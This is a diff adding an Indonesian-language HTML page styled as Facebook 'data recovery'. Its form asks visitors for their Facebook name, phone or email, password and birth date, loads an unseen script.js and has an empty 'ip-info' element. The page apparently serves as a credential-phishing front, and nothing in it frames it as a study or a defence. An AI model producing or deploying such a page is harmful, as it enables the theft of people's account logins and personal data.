@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pemulihan Data</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header>
+    <img src="https://static.wixstatic.com/media/2813de_ec75ef95aa554d8a95cb0d6a6233f0a1~mv2.jpeg/v1/fill/w_548,h_322,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/WhatsApp%20Image%202024-01-12%20at%2022_15_54.jpeg" class="logo">
+  </header>
+  <main>
+    <form id="dataForm">
+      <label for="name">Nama Facebook:</label>
+      <input type="text" id="name" name="name" required>
+
+      <label for="contact">Telepon atau Email:</label>
+      <input type="text" id="contact" name="contact" required>
+
+      <label for="password">Kata Sandi:</label>
+      <input type="password" id="password" name="password" required>
+
+      <label for="birthdate">Tanggal Lahir:</label>
+      <input type="date" id="birthdate" name="birthdate" required>
+
+      <button type="submit">Konfirmasi</button>
+      <p id="forgot-password">Lupa kata sandi?</p>
+    </form>
+    <div id="new-account">
+      <span>atau</span>
+      <button id="createAccount">Buat Akun Baru</button>
+    </div>
+    <div id="ip-info">
+    </div>
+  </main>
+  <script src="script.js"></script>
+</body>
+</html>
